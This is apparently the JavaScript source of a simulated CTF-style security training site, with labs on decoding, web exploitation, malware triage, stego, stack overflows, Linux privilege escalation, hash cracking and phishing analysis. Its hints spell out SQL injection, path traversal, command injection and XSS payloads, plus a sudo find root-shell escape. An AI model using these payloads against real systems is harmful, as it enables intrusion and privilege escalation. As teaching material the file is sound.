 {id:'pe',     track:'MA',  name:'PE Static Triage', tool:'malware static',        blurb:'Dissect a packed Windows binary: sections, entropy, imports, strings. Spot the packer, the injection APIs, the C2 — then write a YARA rule.'},
 {id:'stego',  track:'DF',  name:'Stego & Carving',  tool:'hidden data',           blurb:'Three ways data hides in a file: appended after EOF, buried in metadata, and spread across pixel LSBs. Carve each one out.'},
 {id:'pwn',    track:'PWN', name:'Stack Overflow',   tool:'binary exploitation',   blurb:'A textbook buffer overflow with a live stack diagram. Find the offset, smash the saved return address, redirect to win().'},
 {id:'privesc',track:'SYS', name:'Linux Privesc',    tool:'post-exploitation',     blurb:'You landed a www-data shell. Enumerate sudo, SUID and cron, find the misconfiguration, escalate to root.'},
 {id:'hash',   track:'CR',  name:'Hash Cracking',    tool:'password audit',        blurb:'Identify hash algorithms by shape, crack an unsalted hash with a wordlist, and see exactly why salting defeats you.'},
 {id:'email',  track:'MA',  name:'Phishing Triage',  tool:'email forensics',       blurb:'Read raw headers — SPF/DKIM/DMARC, a lookalike sender, a defanged URL, a base64 attachment — and call the phish.'},
 {id:'intel',  track:'INT', name:'Threat Intel',     tool:'IOC · MITRE ATT&CK',    blurb:'Pull IOCs from an incident and map attacker behaviour to MITRE ATT&CK techniques — the analyst’s daily reps.'},
);
Object.assign(LABOBJ,{
 crypto:[{k:'rot',t:'Solve the Caesar / ROT challenge'},{k:'b64',t:'Solve the Base64 challenge'},{k:'xor',t:'Solve the single-byte XOR challenge'},{k:'rev',t:'Solve the reverse challenge'}],
 web:[{k:'sqli',t:'Bypass the login with SQL injection'},{k:'lfi',t:'Read /etc/passwd via path traversal'},{k:'cmdi',t:'Run a command via OS command injection'},{k:'xss',t:'Fire script via reflected XSS'}],
 pe:[{k:'packed',t:'Identify that the sample is packed'},{k:'imports',t:'Name a code-injection import'},{k:'c2',t:'Find the hardcoded C2 domain'},{k:'yara',t:'Write a YARA rule with no false positives'}],
 stego:[{k:'append',t:'Carve data appended after the JPEG EOF'},{k:'meta',t:'Find the flag hidden in metadata'},{k:'lsb',t:'Extract the LSB-encoded flag'}],
 pwn:[{k:'offset',t:'Find the offset to the saved return address'},{k:'redirect',t:'Redirect execution to win()'},{k:'canary',t:'Explain what a stack canary changes'}],
 privesc:[{k:'sudol',t:'Enumerate sudo rights (sudo -l)'},{k:'suid',t:'List SUID binaries'},{k:'cron',t:'Find the writable root cron job'},{k:'root',t:'Escalate to root'}],
 hash:[{k:'idtype',t:'Identify every hash type correctly'},{k:'crack',t:'Crack the unsalted hash'},{k:'salt',t:'See why salting breaks the attack'}],
 email:[{k:'spf',t:'Spot the SPF / authentication failure'},{k:'spoof',t:'Identify the lookalike sender domain'},{k:'url',t:'Extract the phishing URL'},{k:'payload',t:'Decode the attachment payload'}],
 intel:[{k:'iocs',t:'Classify every IOC correctly'},{k:'attack',t:'Map all behaviours to MITRE ATT&CK'}],
});

/* ---------------- CRYPTO ---------------- */
function cyCaesar(s,k){k=((k%26)+26)%26;return s.replace(/[a-z]/g,c=>String.fromCharCode((c.charCodeAt(0)-97+k)%26+97)).replace(/[A-Z]/g,c=>String.fromCharCode((c.charCodeAt(0)-65+k)%26+65));}
function cyXorStr(s,k){let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^k);return o;}
function cyHex(s){let o='';for(let i=0;i<s.length;i++)o+=s.charCodeAt(i).toString(16).padStart(2,'0');return o;}
function cyFromHex(s){s=s.replace(/[^0-9a-fA-F]/g,'');let o='';for(let i=0;i+1<s.length+1;i+=2){if(i+2>s.length)break;o+=String.fromCharCode(parseInt(s.substr(i,2),16));}return o;}
const CY={
 rot:{flag:'BV{r0t_and_r0ll}', enc:()=>cyCaesar('BV{r0t_and_r0ll}',7)},
 b64:{flag:'BV{b4se_st4ck}',  enc:()=>btoa(btoa('BV{b4se_st4ck}'))},
 xor:{flag:'BV{x0r_me_42}',   enc:()=>cyHex(cyXorStr('BV{x0r_me_42}',0x42))},
 rev:{flag:'BV{m1rror_m1rror}',enc:()=>'BV{m1rror_m1rror}'.split('').reverse().join('')},
};
function cyPaint(){const el=document.getElementById('cybuf');if(el)el.textContent=LAB.cy||'(empty — load a challenge above)';
 Object.keys(CY).forEach(k=>{ if(LAB.cy===CY[k].flag)setObj('crypto',k); });}
function cyLoad(w){LAB.cy=CY[w].enc();cyPaint();toast('loaded '+w+' challenge');}
function cyOp(op){
 try{
  if(op==='clear')LAB.cy='';
  else if(op==='rot13')LAB.cy=cyCaesar(LAB.cy,13);
  else if(op==='caesar'){const n=parseInt(gv('cyshift')||'0',10)||0;LAB.cy=cyCaesar(LAB.cy,n);}
  else if(op==='b64')LAB.cy=atob(LAB.cy);
  else if(op==='hex')LAB.cy=cyFromHex(LAB.cy);
  else if(op==='xor'){const n=parseInt(gv('cykey').replace(/0x/i,''),16);if(!isNaN(n))LAB.cy=cyXorStr(LAB.cy,n&0xff);}
  else if(op==='rev')LAB.cy=LAB.cy.split('').reverse().join('');
 }catch(e){toast('that op failed on the current buffer');}
 cyPaint();
}
function labCrypto(){
 return `
 <p class="lede" style="margin-top:0">A decode workbench (think CyberChef). Load a ciphertext, then stack operations on the buffer until a <code>BV{...}</code> flag falls out.</p>
 <div class="qchips">${Object.keys(CY).map(k=>`<button data-cyload="${k}">load ${k} challenge</button>`).join('')}</div>
 <div class="pktdetail" id="cybuf" style="margin-top:12px">${esc(LAB.cy||'(empty — load a challenge above)')}</div>
 <div class="qchips" style="margin-top:12px">
   <button data-cyop="rot13">ROT13</button>
   <button data-cyop="caesar">Caesar shift</button><input id="cyshift" class="lab-sel" style="width:54px" value="13">
   <button data-cyop="b64">from Base64</button>
   <button data-cyop="hex">from Hex</button>
   <button data-cyop="xor">XOR key</button><input id="cykey" class="lab-sel" style="width:64px" placeholder="hex 42">
   <button data-cyop="rev">Reverse</button>
   <button data-cyop="clear">Clear</button>
 </div>
 <div class="hintbox"><b>Tips:</b> the XOR challenge loads as hex → do <code>from Hex</code>, then <code>XOR</code> key <code>42</code>. The Base64 challenge is wrapped twice. The ROT cipher is a Caesar +7 (decode with shift <code>19</code> or <code>-7</code>).</div>`;
}

/* ---------------- WEB EXPLOITATION ---------------- */
function webSQL(){
 const u=gv('w_user'),p=gv('w_pass'),blob=u+' '+p;
 const q="SELECT * FROM users WHERE user='"+u+"' AND pass='"+p+"'";
 const hasQuote=/['"]/.test(blob);
 const taut=/\bor\b\s+('?\w+'?\s*=\s*'?\w+'?)/i.test(blob);
 const comment=/(--|#|\/\*)/.test(blob);
 const ok=hasQuote&&(taut||comment);
 const out=document.getElementById('w_out');
 if(out)out.innerHTML='<span class="dim">query sent to DB:</span>\n  '+esc(q)+'\n\n'+(ok?'<span class="hl">[+] row returned → logged in as admin. Authentication bypassed.</span>':'<span class="err">[-] 0 rows. Invalid credentials.</span>');
 if(ok)setObj('web','sqli');
}
function resolvePath(p){const st=[];p.split('/').forEach(x=>{if(x===''||x==='.')return;if(x==='..')st.pop();else st.push(x);});return '/'+st.join('/');}
function webLFI(){
 const inp=gv('w_path'),full=resolvePath('/var/www/html/'+inp),out=document.getElementById('w_out');
 const win=full==='/etc/passwd';
 const body=win?'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000::/home/admin:/bin/bash\n<span class="hl">[+] traversal escaped the web root → /etc/passwd read.</span>':'<span class="err">[-] resolves to '+esc(full)+' — still inside the web root or missing.</span>';
 if(out)out.innerHTML='<span class="dim">GET /view?file='+esc(inp)+'</span>\n\n'+body;
 if(win)setObj('web','lfi');
}
function webCMD(){
 const h=gv('w_host'),out=document.getElementById('w_out'),cmd='ping -c1 '+h;
 const injected=/[;&|`]|\$\(/.test(h);
 let res='';
 if(/\bid\b/.test(h))res='uid=33(www-data) gid=33(www-data) groups=33(www-data)';
 else if(/whoami/.test(h))res='www-data';
 else if(/cat\s+\/etc\/passwd/.test(h))res='root:x:0:0:root:/root:/bin/bash ...';
 else if(injected)res='(command executed, no stdout)';
 if(out)out.innerHTML='<span class="dim">$ '+esc(cmd)+'</span>\nPING: 1 packet transmitted\n'+(injected?'<span class="hl">[+] shell metacharacter broke out → second command ran:</span>\n'+esc(res):'<span class="err">[-] '+esc(h)+' treated as a hostname (no injection).</span>');
 if(injected)setObj('web','cmdi');
}
function webXSS(){
 const s=gv('w_xss'),out=document.getElementById('w_out');
 const fire=/<script|onerror\s*=|onload\s*=|javascript:|<svg[^>]*on|<img[^>]*onerror/i.test(s);
 if(out)out.innerHTML='Server reflects your input into the page (shown safely escaped here):\n  '+esc(s)+'\n\n'+(fire?'<span class="hl">[+] in a real unescaped sink this executes → alert(1) fires in the victim browser.</span>':'<span class="err">[-] inert — no script/handler context.</span>');
 if(fire)setObj('web','xss');
}
function webHint(t){return {
 sqli:'Classic payloads: <code>\' OR \'1\'=\'1</code> in the password, or <code>admin\'--</code> in the username to comment out the rest.',
 lfi:'Climb out of the web root with <code>../</code> repeated, e.g. <code>../../../../etc/passwd</code>.',
 cmdi:'The host is concatenated into a shell command. Append <code>; id</code> or <code>| cat /etc/passwd</code>.',
 xss:'The input is reflected unescaped. Try <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>.'
}[t];}
function labWeb(){
 const tab=LAB.webTab,tabs=[['sqli','SQL injection'],['lfi','Path traversal'],['cmdi','Command injection'],['xss','Reflected XSS']];
 let body='';
 if(tab==='sqli')body=`<div class="pcode"><span class="cm">// server:</span> "SELECT * FROM users WHERE user='" + user + "' AND pass='" + pass + "'"</div>
   <div class="findform" style="margin-top:10px"><div><label>username</label><input id="w_user" placeholder="admin"></div><div><label>password</label><input id="w_pass" placeholder="try: ' OR '1'='1"></div></div>
   <div style="margin-top:10px"><button class="btn" data-webact="sqli">Login ▸</button></div>`;
 else if(tab==='lfi')body=`<div class="pcode"><span class="cm">// server:</span> readFile("/var/www/html/" + req.query.file)</div>
   <div class="findform" style="margin-top:10px"><div class="full"><label>file</label><input id="w_path" placeholder="../../../../etc/passwd"></div></div>
   <div style="margin-top:10px"><button class="btn" data-webact="lfi">Fetch ▸</button></div>`;
 else if(tab==='cmdi')body=`<div class="pcode"><span class="cm">// server:</span> exec("ping -c1 " + req.query.host)</div>
   <div class="findform" style="margin-top:10px"><div class="full"><label>host to ping</label><input id="w_host" placeholder="127.0.0.1; id"></div></div>
   <div style="margin-top:10px"><button class="btn" data-webact="cmdi">Ping ▸</button></div>`;
 else body=`<div class="pcode"><span class="cm">// server:</span> render("&lt;p&gt;Results for: " + req.query.q + "&lt;/p&gt;")  <span class="cm">// unescaped</span></div>
   <div class="findform" style="margin-top:10px"><div class="full"><label>search query</label><input id="w_xss" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"></div></div>
   <div style="margin-top:10px"><button class="btn" data-webact="xss">Search ▸</button></div>`;
 return `<div class="logtabs">${tabs.map(x=>`<button data-webtab="${x[0]}" aria-current="${tab===x[0]}">${x[1]}</button>`).join('')}</div>
  ${body}
  <div class="pktdetail" id="w_out" style="margin-top:12px">craft a payload and submit…</div>
  <div class="hintbox"><b>Hint:</b> ${webHint(tab)} <span class="dim">— all endpoints are simulated; nothing is actually executed.</span></div>`;
}

/* ---------------- PE STATIC TRIAGE ---------------- */
const PE={
 name:'invoice_2026.pdf.exe',
 sections:[['.text','0x1000','0x1200',6.4],['.rdata','0x400','0x400',5.1],['.data','0x200','0x200',3.2],['UPX0','0x6000','0x0',0.0],['UPX1','0x5e00','0x5e00',7.93]],
 impPacked:['kernel32.dll!LoadLibraryA','kernel32.dll!GetProcAddress','kernel32.dll!VirtualProtect','kernel32.dll!ExitProcess'],
 impReal:['kernel32.dll!VirtualAlloc','kernel32.dll!WriteProcessMemory','kernel32.dll!CreateRemoteThread','wininet.dll!InternetOpenUrlA','advapi32.dll!RegSetValueExA'],
 strPacked:['!This program cannot be run in DOS mode','UPX!','UPX0','UPX1','1.26 Copyright (C) 1996-2024'],
 strReal:['http://updates-cdn.xyz/gate.php','Software\\Microsoft\\Windows\\CurrentVersion\\Run','InjectAndRun','BV{p4ck3d_n0_m0r3}','%TEMP%\\svc.exe'],
};
function labPE(){
 const tab=LAB.peTab,up=LAB.peUnpacked;
 const tabs=[['overview','overview'],['sections','sections'],['imports','imports'],['strings','strings'],['yara','YARA rule']];
 let body='';
 if(tab==='overview')body=`<table class="kv"><tr><th>field</th><th>value</th></tr>
   <tr><td>file</td><td>${PE.name} <span class="tag-bad">(double extension!)</span></td></tr>
   <tr><td>type</td><td>PE32 executable (GUI) Intel 80386</td></tr>
   <tr><td>imphash</td><td>a3f1...c0 <span class="dim">(few imports)</span></td></tr>
   <tr><td>state</td><td>${up?'<span class="tag-ok">unpacked (dumped from memory)</span>':'<span class="tag-bad">packed — only 4 imports, UPX1 entropy 7.93</span>'}</td></tr></table>
   <div style="margin-top:12px"><button class="btn" data-peunpack="1">${up?'Re-pack view':'Unpack (emulate to OEP) ▸'}</button></div>`;
 else if(tab==='sections')body=`<table class="kv"><tr><th>name</th><th>virt</th><th>raw</th><th>entropy</th><th></th></tr>
   ${PE.sections.map(s=>`<tr><td>${s[0]}</td><td>${s[1]}</td><td>${s[2]}</td><td>${s[3].toFixed(2)}</td><td>${s[3]>7.2?'<span class="tag-bad">near-8.0 → compressed/encrypted</span>':(s[0].indexOf('UPX')===0?'<span class="tag-bad">packer section name</span>':'')}</td></tr>`).join('')}</table>`;
 else if(tab==='imports'){const list=up?PE.impReal:PE.impPacked;body=`<div class="pktdetail">${list.map(i=>{const bad=/VirtualAlloc|WriteProcessMemory|CreateRemoteThread|InternetOpenUrl/.test(i);return (bad?'<span class="hl">':'<span class="dim">')+esc(i)+(bad?'  ← injection / network':'')+'</span>';}).join('\n')}</div>${up?'':'<div class="hintbox" style="margin-top:10px">Only loader stubs visible (LoadLibrary/GetProcAddress/VirtualProtect). Real imports are hidden until you unpack — go to <b>overview → Unpack</b>.</div>'}`;}
 else if(tab==='strings'){const list=up?PE.strReal:PE.strPacked;body=`<div class="pktdetail">${list.map(s=>{const bad=/http|Run|Inject|TEMP|BV\{/.test(s);return (bad?'<span class="hl">':'<span class="dim">')+esc(s)+'</span>';}).join('\n')}</div>`;}
 else body=`<p class="lede" style="margin-top:0;font-size:14px">Pick the strings your rule will match on, then test it. A good rule fires on THIS sample and (almost) nothing else.</p>
   <div class="pktdetail">${[...PE.strPacked,...PE.strReal].map((s,i)=>`<label style="display:block;cursor:pointer"><input type="checkbox" data-yara value="${esc(s)}"> ${esc(s)}</label>`).join('')}</div>
   <div style="margin-top:10px"><button class="btn" data-peyara="1">Test rule</button></div>
   <div class="pktdetail" id="pe_yres" style="margin-top:10px">no rule tested yet.</div>`;
 return `<div class="logtabs">${tabs.map(x=>`<button data-petab="${x[0]}" aria-current="${tab===x[0]}">${x[1]}</button>`).join('')}</div>
  ${body}
  <div class="objbox" style="margin-top:18px"><h4>Submit findings</h4><div class="findform">
    <div><label>Is it packed? (yes/no)</label><input id="pe_packed" placeholder="yes/no"></div>
    <div><label>C2 domain</label><input id="pe_c2" placeholder="found in strings"></div>
    <div class="full"><label>An injection import</label><input id="pe_api" placeholder="kernel32 function"></div>
  </div><div style="margin-top:10px"><button class="btn" data-pecheck="1">Check findings</button></div></div>`;
}
function peCheck(){
 if(/^y/i.test(gv('pe_packed')))setObj('pe','packed'); else if(gv('pe_packed'))toast('look at UPX1 entropy + the tiny import table');
 if(gv('pe_c2').toLowerCase().includes('updates-cdn'))setObj('pe','c2'); else if(gv('pe_c2'))toast('unpack, then read strings for an http URL');
 if(/virtualalloc|writeprocessmemory|createremotethread/i.test(gv('pe_api')))setObj('pe','imports'); else if(gv('pe_api'))toast('which API writes code into another process?');
}
function peYara(){
 const sel=[].slice.call(document.querySelectorAll('[data-yara]')).filter(x=>x.checked).map(x=>x.value);
 const out=document.getElementById('pe_yres');if(!out)return;
 const unique=sel.some(s=>/updates-cdn\.xyz|InjectAndRun|BV\{/.test(s));
 const generic=sel.some(s=>/DOS mode|UPX!|UPX0|UPX1|Copyright/.test(s));
 if(!sel.length){out.textContent='select at least one string.';return;}
 if(generic){out.innerHTML='<span class="err">rule matches thousands of unrelated files — "DOS mode", "UPX!" etc. are everywhere. Pick strings unique to this sample.</span>';}
 else if(unique){out.innerHTML='<span class="hl">rule matches the sample · 0 false positives. Solid — you keyed on unique artifacts (the C2 URL / custom strings).</span>';setObj('pe','yara');}
 else out.textContent='valid rule but it would not reliably match — prefer the unique strings.';
}

/* ---------------- STEGO & CARVING ---------------- */
const STG={appendFlag:'BV{4pp3nd3d_z1p}',metaFlag:'BV{m3ta_h1des}',lsbFlag:'BV{lsb_b1ts}'};
function stegAct(w){
 const out=document.getElementById('stg_out');if(!out)return;
 if(w==='append'){out.innerHTML='$ binwalk photo.jpg\n  0x0     JPEG image data\n  0x4F1A  <span class="hl">Zip archive</span> (data AFTER the FF D9 end-of-image marker)\n$ unzip -p photo.jpg\n  secret.txt: <span class="hl">'+STG.appendFlag+'</span>';setObj('stego','append');}
 else if(w==='meta')out.innerHTML='$ exiftool photo.jpg\n  Make            : Canon\n  Software        : GIMP 2.10\n  User Comment    : <span class="hl">'+STG.metaFlag+'</span>',setObj('stego','meta');
 else if(w==='lsb'){let bits=[];for(const ch of STG.lsbFlag){const b=ch.charCodeAt(0).toString(2).padStart(8,'0');for(const x of b)bits.push(+x);}let s='';for(let i=0;i<bits.length;i+=8)s+=String.fromCharCode(parseInt(bits.slice(i,i+8).join(''),2));out.innerHTML='$ extract LSB of each pixel byte → regroup into bytes:\n  bits: '+bits.join('')+'\n  ascii: <span class="hl">'+esc(s)+'</span>';setObj('stego','lsb');}
}
function labStego(){
 return `<p class="lede" style="margin-top:0">One file, three hiding spots. Run each tool and carve out the flag.</p>
 <div class="pcode"><span class="cm">// photo.jpg structure</span>
 FF D8 FF E0  JFIF header
 ...          image scan data
 FF D9        &lt;-- JPEG end-of-image (EOF)
 50 4B 03 04  &lt;-- ??? bytes living past the EOF</div>
 <div class="qchips" style="margin-top:12px">
   <button data-steg="append">binwalk / carve trailing bytes</button>
   <button data-steg="meta">exiftool (read metadata)</button>
   <button data-steg="lsb">extract pixel LSBs</button>
 </div>
 <div class="pktdetail" id="stg_out" style="margin-top:12px">run a tool above…</div>
 <div class="hintbox"><b>Real reflexes:</b> always check for data after the format's EOF marker (<code>binwalk</code>, <code>foremost</code>), read metadata (<code>exiftool</code>), and for images suspect the least-significant bits when file size looks off vs. content.</div>`;
}

/* ---------------- STACK OVERFLOW (PWN) ---------------- */
function pwnStackHtml(fill,tgt,win){
 const overRbp=fill>16, atRet=fill===24&&tgt, overshoot=fill>24;
 const retVal=atRet?tgt:(overshoot?"'A'×8 (overshot)":'intact');
 return `<div class="srow buf ${fill>0?'ow':''}"><span>char buf[16]</span><b>${fill>=16?"'A'×16 (full)":"'A'×"+fill}</b></div>
 <div class="srow rbp ${overRbp?'ow':''}"><span>saved RBP (8)</span><b>${overRbp?'clobbered':'intact'}</b></div>
 <div class="srow ret ${(atRet||overshoot)?'ow':''}"><span>saved RIP / ret (8)</span><b>${retVal}</b></div>
 <div class="srow"><span>ret jumps to →</span><b>${atRet&&tgt===win?'win() → /bin/sh':((atRet||overshoot)?'crash (SIGSEGV)':'normal return')}</b></div>`;
}
function pwnRender(){
 const fill=parseInt(gv('pw_fill')||'0',10)||0, tgt=gv('pw_tgt'), win='0x401162';
 const atRet=fill===24&&!!tgt;
 if(fill===24)setObj('pwn','offset');
 let msg;
 if(atRet&&tgt===win){msg='<span class="hl">[+] payload = \'A\'×24 + '+esc(win)+' → saved RIP = win() → system("/bin/sh") → # got a shell!</span>';setObj('pwn','redirect');}
 else if(atRet)msg='<span class="err">[!] you overwrote the return address with '+esc(tgt)+' → SIGSEGV. Aim those 8 bytes at win() (0x401162).</span>';
 else if(fill>24)msg='<span class="err">[!] overshot: '+fill+' filler bytes ran past the return slot. Use exactly 24, then the address.</span>';
 else if(fill>16)msg='<span class="dim">into the saved RBP ('+fill+'/24). A few more filler bytes reach the return address.</span>';
 else msg='<span class="dim">buffer is '+fill+'/16 full. Fill 16 (buf) + 8 (saved RBP) = 24, then pick an address.</span>';
 const o=document.getElementById('pw_out');if(o)o.innerHTML=msg;
 const s=document.getElementById('pw_stack');if(s)s.innerHTML=pwnStackHtml(fill,tgt,win);
}
function labPwn(){
 return `<div class="pcode"><span class="kw">void</span> win() { system(<span class="st">"/bin/sh"</span>); }      <span class="cm">// lives at 0x401162, never called</span>
<span class="kw">void</span> vuln() { <span class="kw">char</span> buf[16]; gets(buf); }   <span class="cm">// gets() = no bounds check</span></div>
 <div class="rebench" style="margin-top:12px">
   <div class="repane"><h5>payload builder</h5><div style="padding:14px;line-height:2">
     <span class="prog" style="color:var(--ash)">filler bytes ('A' × n)</span><br>
     <input id="pw_fill" type="number" class="lab-sel" style="width:90px" value="0"> <span class="prog" style="color:var(--ash)">→ buf 16 + saved rbp 8 = 24</span><br>
     <span class="prog" style="color:var(--ash)">then overwrite saved RIP with</span><br>
     <select id="pw_tgt" class="lab-sel"><option value="">— pick an address —</option><option value="0x401162">0x401162  &lt;win&gt;</option><option value="0x401050">0x401050  &lt;printf&gt;</option><option value="0x41414141">0x41414141  (AAAA)</option></select><br>
     <button class="btn" data-pwncalc="1" style="margin-top:6px">Send payload ▸</button>
     <div class="verdict" id="pw_out" style="margin-top:10px"></div>
   </div></div>
   <div class="repane"><h5>the stack (high → low)</h5><div class="stack" id="pw_stack"></div></div>
 </div>
 <div class="objbox" style="margin-top:18px"><h4>Concept check</h4>
   <p style="color:var(--ash);font-size:14px;margin:0 0 8px">A stack canary is now compiled in. Why does this exploit break?</p>
   <button class="opt" data-pwncan="0"><b>A</b>Nothing changes, it still works</button>
   <button class="opt" data-pwncan="1"><b>B</b>A random value sits between buf and saved RIP; overflowing corrupts it, and it's checked before ret → abort</button>
   <button class="opt" data-pwncan="0"><b>C</b>gets() becomes bounds-checked</button>
 </div>
 <div class="hintbox"><b>Offset:</b> saved return address = 16 (buffer) + 8 (saved RBP) = <code>24</code> filler bytes, then the 8-byte address. Point it at <code>win()</code> = <code>0x401162</code>.</div>`;
}

/* ---------------- LINUX PRIVESC ---------------- */
function privBanner(){return ['<span class="dim">www-data shell on web01 (from the web exploit). Goal: become root.</span>','<span class="dim">Enumerate, then escalate. Try: whoami · id · sudo -l · find / -perm -4000 2>/dev/null · cat /etc/crontab · ls -la /opt · help</span>',''];}
function privPaint(){const el=document.getElementById('privout');if(el){el.innerHTML=LAB.privOut.join('\n');el.scrollTop=el.scrollHeight;}}
function privRun(line){
 const out=LAB.privOut;out.push('<span class="pmt">www-data@web01:/$</span> '+esc(line));
 const c=line.trim(),P_=v=>out.push(v);
 if(c==='') {}
 else if(c==='whoami')P_('www-data');
 else if(c==='id')P_('uid=33(www-data) gid=33(www-data) groups=33(www-data)');
 else if(/^sudo\s+-l$/.test(c)){P_('Matching Defaults entries for www-data on web01:');P_('User www-data may run the following commands on web01:');P_('    <span class="hl">(root) NOPASSWD: /usr/bin/find</span>');setObj('privesc','sudol');}
 else if(/find\s+\/\s+-perm\s+-4000/.test(c)){['/usr/bin/sudo','/usr/bin/passwd','/usr/bin/mount','/usr/bin/su','/usr/bin/pkexec'].forEach(x=>P_(x));P_('<span class="dim">(this SUID set is normal — your guaranteed path is the sudo NOPASSWD on /usr/bin/find)</span>');setObj('privesc','suid');}
 else if(c==='cat /etc/crontab'){P_('# m h dom mon dow user   command');P_('* *  *  *  *   root     /opt/backup.sh');P_('<span class="dim">root runs /opt/backup.sh every minute — check its permissions</span>');setObj('privesc','cron');}
 else if(/^ls\s+-la\s+\/opt/.test(c)||/\/opt\/backup\.sh/.test(c)){P_('-rwxrwxrwx 1 root root 214 /opt/backup.sh   <span class="hl">(world-writable, executed as root)</span>');}
 else if(/sudo\s+(\/usr\/bin\/)?find\s+.*-exec\s+(\/bin\/)?(sh|bash)/.test(c)){P_('<span class="hl"># id</span>');P_('<span class="hl">uid=0(root) gid=0(root) groups=0(root)</span>');P_('<span class="hl">[+] GTFOBins: `sudo find ... -exec /bin/sh \\;` spawned a ROOT shell. Pwned.</span>');setObj('privesc','root');}
 else if(/echo\s+.*>>?\s*\/opt\/backup\.sh/.test(c)){P_('<span class="hl">[+] payload appended to the world-writable root cron script → root within 60s. Second path works too.</span>');setObj('privesc','root');}
 else if(c==='help')P_('whoami · id · sudo -l · find / -perm -4000 2>/dev/null · cat /etc/crontab · ls -la /opt · then a GTFOBins escape, e.g.  sudo find . -exec /bin/sh \\;');
 else if(c==='clear'){LAB.privOut=privBanner();privPaint();return;}
 else P_('<span class="err">'+esc((c.split(/\s+/)[0]||''))+': command not found  (type help)</span>');
 out.push('');privPaint();
}
function labPrivesc(){
 if(!LAB.privOut.length)LAB.privOut=privBanner();
 const chips=['whoami','id','sudo -l','find / -perm -4000 2>/dev/null','cat /etc/crontab','ls -la /opt','sudo find . -exec /bin/sh \\;'];
 return `<div class="term"><div class="term__out" id="privout">${LAB.privOut.join('\n')}</div>
   <div class="term__in"><span>$</span><div class="term-input-wrapper"><input id="privcmd" autocomplete="off" spellcheck="false" placeholder="enumerate, then escalate…"><span class="term-input-ghost" id="privcmd-ghost"></span></div></div></div>
 <div class="qchips">${chips.map(c=>`<button data-privq="${esc(c)}">${esc(c)}</button>`).join('')}</div>
 <div class="hintbox"><b>GTFOBins:</b> a binary you can run as root via sudo often has a documented shell escape. <code>sudo find . -exec /bin/sh \\;</code> runs <code>/bin/sh</code> with find's root privileges. Memorise the pattern: <i>enumerate → match the binary to a known escape → spawn root</i>.</div>`;
}

/* ---------------- HASH CRACKING ---------------- */
const HASHL={
 rows:[['5f4dcc3b5aa765d61d8327deb882cf99','MD5'],['d033e22ae348aeb5660fc2140aec35850c4da997','SHA-1'],['1c8bfe8f801d79745c4631d09fff36c82aa37fc4cce4fc946683d7b336b63032','SHA-256'],['$2b$12$KIXxPfnK3p9aF7s.eQ8Z8u','bcrypt'],['8846f7eaee8fb117ad06bdd830b7586c','NTLM']],
 types:['MD5','SHA-1','SHA-256','bcrypt','NTLM'],
 target:'5f4dcc3b5aa765d61d8327deb882cf99',
 wl:[['e10adc3949ba59abbe56e057f20f883e','123456'],['5f4dcc3b5aa765d61d8327deb882cf99','password'],['21232f297a57a5a743894a0e4a801fc3','admin'],['0d107d09f5bbe40cade3de5c71e9e9b7','letmein']],
};
function hashIdCheck(){let ok=true;HASHL.rows.forEach((r,i)=>{if(gv('h_id_'+i)!==r[1])ok=false;});if(ok)setObj('hash','idtype');else toast('not all correct — length (32/40/64 hex) and the $2b$ prefix are the tells');}
function hashCrack(){const out=document.getElementById('h_crack');if(!out)return;let html='running md5 over the wordlist against '+HASHL.target.slice(0,12)+'…\n';let found='';HASHL.wl.forEach(p=>{const hit=p[0]===HASHL.target;html+='  '+p[1].padEnd(10)+'→ '+p[0].slice(0,8)+'  '+(hit?'<span class="hl">✓ MATCH</span>':'✗')+'\n';if(hit)found=p[1];});html+='\n<span class="hl">[+] cracked: '+found+'</span>';out.innerHTML=html;setObj('hash','crack');}
function hashSalt(){const out=document.getElementById('h_salt');if(!out)return;out.innerHTML='md5("password")            = 5f4dcc3b…cf99\nmd5("x7Gk" + "password")    = b9c1a4…    (different)\nmd5("qZ2p" + "password")    = 0f7e22…    (different)\n<span class="hl">[+] same password, unique per-user salts → unique hashes. The precomputed wordlist/rainbow table no longer lines up: you must brute each salt separately.</span>';setObj('hash','salt');}
function labHash(){
 return `<p class="lede" style="margin-top:0">Three skills: identify the algorithm by shape, crack an unsalted hash with a wordlist, and see why salting wrecks the attack.</p>
 <h4 style="font-family:var(--mono);color:var(--volt);font-size:11px;letter-spacing:.2em">1 · IDENTIFY</h4>
 <table class="kv"><tr><th>hash</th><th>your call</th></tr>
 ${HASHL.rows.map((r,i)=>`<tr><td style="word-break:break-all">${r[0]}</td><td><select id="h_id_${i}" class="lab-sel"><option value="">—</option>${HASHL.types.map(t=>`<option value="${t}">${t}</option>`).join('')}</select></td></tr>`).join('')}</table>
 <div style="margin-top:10px"><button class="btn" data-hashid="1">Check types</button></div>
 <h4 style="font-family:var(--mono);color:var(--volt);font-size:11px;letter-spacing:.2em;margin-top:22px">2 · CRACK</h4>
 <p style="color:var(--ash);font-size:13.5px;margin:0">Target: <code>${HASHL.target}</code> · wordlist of 4. <button class="btn" data-hashcrack="1" style="margin-left:8px">Run dictionary attack</button></p>
 <div class="pktdetail" id="h_crack" style="margin-top:10px">—</div>
 <h4 style="font-family:var(--mono);color:var(--volt);font-size:11px;letter-spacing:.2em;margin-top:22px">3 · WHY SALT</h4>
 <p style="margin:0"><button class="btn" data-hashsalt="1">Show salted vs unsalted</button></p>
 <div class="pktdetail" id="h_salt" style="margin-top:10px">—</div>`;
}

/* ---------------- PHISHING / EMAIL ---------------- */
const MAIL={
 headers:[['From','"PayPaI Service" &lt;service@paypa1-secure.com&gt;',1],['Return-Path','&lt;bounce@mailer-xyz.ru&gt;',1],['Reply-To','support@paypa1-secure.com',1],['Received-SPF','fail (domain of paypal.com does not designate 45.133.1.88 as permitted sender)',1],['Authentication-Results','dkim=none; dmarc=fail (p=reject)',1],['Subject','Your account is limited — verify within 24h',0]],
 url:'http://paypa1-secure.com/verify/login.php',
 attB64:'PGh0bWw+PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+PC9odG1sPg==',
};
function mailDefang(){const o=document.getElementById('m_out');if(o)o.textContent='defanged → '+MAIL.url.replace(/^http/,'hxxp').replace(/\./g,'[.]');}
